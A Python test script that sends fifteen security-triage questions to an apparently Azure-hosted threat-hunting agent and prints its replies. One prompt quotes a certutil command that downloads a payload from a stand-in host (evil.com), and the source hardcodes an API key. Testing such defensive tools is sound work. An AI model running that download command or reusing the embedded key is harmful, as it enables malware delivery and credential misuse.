"""Dump 15 full Q&A responses for review."""

import os
import time

import requests

os.environ["PYTHONIOENCODING"] = "utf-8"

BASE = "https://mssphuntagent-fn.azurewebsites.net/api/v1"
KEY = "qvMa0mwbfz3itHZMO20kbkWfpAr-oY9_1WHmJpFeK2EmAzFuK-xiGQ=="

PROMPTS = [
    "Are we vulnerable to CVE-2024-3400",
    "How likely is CVE-2024-3400 to be exploited in the wild",
    "Give me the full risk profile for CVE-2024-3400 including CVSS EPSS and CISA KEV status",
    "Check IP 185.220.101.42 for threat intelligence",
    "Is IP 185.220.101.1 a known TOR exit node",
    "Enrich IP 8.8.8.8 with all available threat intelligence",
    "Enrich this file hash: 44d88612fea8a8f36de82e1278abb02f",
    "Is mshta.exe a known living-off-the-land binary",
    "Check if certutil.exe can be abused for attacks",
    "We found a driver file procexp152.sys on an endpoint. Is this a known vulnerable driver",
    "We found sign-ins from IP 185.220.101.42 to admin account trevor.cutshall. Is this IP malicious and should we be concerned",
    "An endpoint ran certutil.exe -urlcache -f http://evil.com/payload.exe. Analyze this for threats",
    "CVE-2024-3400 was announced. What is the EPSS score and do we have Palo Alto devices in our environment",
    "Check if any of our admin accounts are signing in from known malicious IPs",
    "We found rundll32.exe loading a suspicious DLL. Check if this is LOLBin abuse and check the DLL hash against threat feeds",
]


def main():
    print(f"Submitting {len(PROMPTS)} prompts...")
    rids = []
    for p in PROMPTS:
        r = requests.post(f"{BASE}/ask?code={KEY}", json={"message": p}, timeout=15)
        rids.append(r.json().get("request_id", "FAIL"))

    print("Waiting 180s...")
    time.sleep(180)

    for i, rid in enumerate(rids):
        r = requests.get(f"{BASE}/ask/{rid}?code={KEY}", timeout=15)
        d = r.json()
        if d.get("status") == "processing":
            time.sleep(45)
            r = requests.get(f"{BASE}/ask/{rid}?code={KEY}", timeout=15)
            d = r.json()

        resp = d.get("response", "") or ""
        print()
        print("=" * 70)
        print(f"Q{i+1}: {PROMPTS[i]}")
        print("=" * 70)
        safe = resp[:2000].encode("ascii", "replace").decode()
        print(safe)
        if len(resp) > 2000:
            print(f"... [{len(resp)} total chars]")


if __name__ == "__main__":
    main()
